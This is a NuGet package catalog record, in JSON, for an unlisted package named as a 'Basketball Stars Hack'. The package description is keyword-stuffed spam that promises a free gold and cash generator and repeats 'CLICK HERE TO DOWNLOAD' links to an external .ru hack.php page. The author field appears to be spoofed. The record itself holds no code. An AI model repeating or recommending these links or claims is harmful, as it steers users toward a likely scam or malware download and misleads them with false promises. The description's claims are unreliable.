{
  "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.28.23.59.24/_basketball-stars-hack-working-2022-version-cbn.5.4.73.json",
  "@type": [
    "PackageDetails",
    "catalog:Permalink"
  ],
  "authors": "SharpCrafters s.r.o.",
  "catalog:commitId": "17447ea0-b188-4818-9be2-1d2c04603e9a",
  "catalog:commitTimeStamp": "2022-01-28T23:59:24.4016579Z",
  "created": "2022-01-26T10:11:39.803Z",
  "description": "# _Basketball Stars Hack Working 2022 Version cbn\n\n\nCLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; [http://4.bltadwin.ru/hack.php](http://4.bltadwin.ru/hack.php)\n\n\nCheat function: Always perfect shoot - Shooting is always perfect (must be issued) 2. Always backplane - Always get the backplane bonus without hitting it 3. Download Apk Latest Version of Basketball Stars MOD, The Sports Game of Basketball Stars Mod in your Android Device today you're able to Hack that Game. Basketball Stars Mod Apk comes with almost every basketball feature you can imagine. About Basketball Star. Basketball Star is an android game from the desk.\n\n## [CLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; http://4.bltadwin.ru/hack.php](http://4.bltadwin.ru/hack.php)\n\n · We are proud to present our latest online hack tool for Basketball Stars, the Free Gold and Cash Generator. In just two minutes, you can get some money and gold. After many weeks of testing, we. Basketball Stars Mod App Description. Learn and show your skills on the field of Basketball, unleash moves and fakes to juke out your opponent, and shoot for the basket. In addition, you have to stay in the face of the attacker, quickly steal the ball and run swiftly to make your shot. There is a need for your smart strategy to win the multiplex matches of Basketball Stars . Here's your answer, Basketball Stars Hack, a brand new hack cheat tool that will generate the desired amount of Cash and Gold for you. This tool can .\n\nbasketball stars hacks, basketball stars hack 2021, basketball stars hack download, basketball stars hacked unblocked, basketball stars hack apk, basketball stars hack ios, basketball stars hack auto win, basketball stars hack 2020, basketball stars hack ios no jailbreak, basketball stars hack mod apk, basketball stars hack apk 2020, basketball stars hack apk dinero infinito, basketball stars hack apk 2021, basketball stars gold hack apk, rival stars basketball hack apk download, rival stars basketball hack android, basketball stars backboard hack, basketball stars by miniclip hack, basketball stars gold hack, basketball stars hack ios download, download rival stars basketball hack, basketball stars hack deutsch, hack de basketball stars, basketball stars freeze hack, basketball stars apk file hack, hack for basketball stars, basketball stars hack gold, basketball stars hack generator, basketball stars gold hack no human verification, basketball stars gold hack ios, basketball stars hack unlimited gold, rival stars basketball gold hack, hack basketball stars gems, basketball stars hack without human verification, basketball stars hack no human verification, how to hack basketball stars, rival stars basketball hack ios, basketball stars level hack, hack basketball stars lucky patcher, basketball stars cheat codes, basketball stars miniclip hack, basketball stars hack unlimited money, basketball stars hack apk unlimited money, basketball stars hack version unlimited money mod, rival stars basketball hack mod apk, basketball stars hack no verification, nba ball stars hack, nba ball stars cheats, basketball stars online hack, hack of basketball stars, basketball stars perfect shot hack, hack para basketball stars, rival stars basketball hack, basketball stars shooting hack, basketball stars speed hack, rival stars basketball hacks, telecharger basketball stars hack, how to hack basketball stars using lucky patcher, basketball stars hack version, basketball stars unlimited gold, basketball stars hacked apk",
  "id": "_Basketball-Stars-Hack-Working-2022-Version-cbn",
  "isPrerelease": false,
  "language": "en-US",
  "lastEdited": "2022-01-28T23:45:40.403Z",
  "listed": false,
  "packageHash": "/FaFlhOgig7u2kL5/Qr9xFh/N9D4SE2sZIXTka1tt4my06RUo+Nu+sA89kRbx95Hc8zthIxFFCkZkYoYBeNV3w==",
  "packageHashAlgorithm": "SHA512",
  "packageSize": 11424,
  "published": "1900-01-01T00:00:00Z",
  "requireLicenseAcceptance": false,
  "title": "_Basketball-Stars-Hack-Working-2022-Version-cbn",
  "verbatimVersion": "5.4.73",
  "version": "5.4.73",
  "packageEntries": [
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.28.23.59.24/_basketball-stars-hack-working-2022-version-cbn.5.4.73.json#kchtschbra.nuspec",
      "@type": "PackageEntry",
      "compressedLength": 1296,
      "fullName": "kchtschbra.nuspec",
      "length": 3986,
      "name": "kchtschbra.nuspec"
    },
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.28.23.59.24/_basketball-stars-hack-working-2022-version-cbn.5.4.73.json#.signature.p7s",
      "@type": "PackageEntry",
      "compressedLength": 9468,
      "fullName": ".signature.p7s",
      "length": 9468,
      "name": ".signature.p7s"
    }
  ],
  "@context": {
    "@vocab": "http://schema.nuget.org/schema#",
    "catalog": "http://schema.nuget.org/catalog#",
    "xsd": "http://www.w3.org/2001/XMLSchema#",
    "dependencies": {
      "@id": "dependency",
      "@container": "@set"
    },
    "dependencyGroups": {
      "@id": "dependencyGroup",
      "@container": "@set"
    },
    "packageEntries": {
      "@id": "packageEntry",
      "@container": "@set"
    },
    "packageTypes": {
      "@id": "packageType",
      "@container": "@set"
    },
    "supportedFrameworks": {
      "@id": "supportedFramework",
      "@container": "@set"
    },
    "tags": {
      "@id": "tag",
      "@container": "@set"
    },
    "vulnerabilities": {
      "@id": "vulnerability",
      "@container": "@set"
    },
    "published": {
      "@type": "xsd:dateTime"
    },
    "created": {
      "@type": "xsd:dateTime"
    },
    "lastEdited": {
      "@type": "xsd:dateTime"
    },
    "catalog:commitTimeStamp": {
      "@type": "xsd:dateTime"
    },
    "reasons": {
      "@container": "@set"
    }
  }
}